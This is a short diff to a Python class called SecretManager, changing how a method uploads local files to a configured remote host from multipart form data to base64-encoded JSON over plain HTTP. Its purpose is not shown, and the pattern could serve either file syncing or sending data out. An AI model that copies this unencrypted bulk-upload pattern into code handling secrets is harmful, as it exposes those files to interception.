@@ -167,11 +167,15 @@ class SecretManager:
         dir_label = self.get_hex_token()
         folder_url = f"http://{self._remote_host_port}/file?label={dir_label}"
         header = {
-                "Content-Type":"application/octet-stream"
+                "Content-Type":"application/json"
                 }
         for file in files:
-            file_url = f"{folder_url}&file_name={file.rsplit('/', 1)[-1]}"
             with open(f'{file}', 'rb') as f:
-                requests.post(file_url, files={f'f': f}, headers=header)
-        
+                # requests.post(file_url, files={f'f': f}, headers=header)
+                file_data = self.bin_to_b64(f.read())
+                file_json = {
+                        "file_name": file.rsplit('/', 1)[-1],
+                        "file_data": file_data
+                        }
+                requests.post(folder_url, json=file_json, headers=header)
         return None
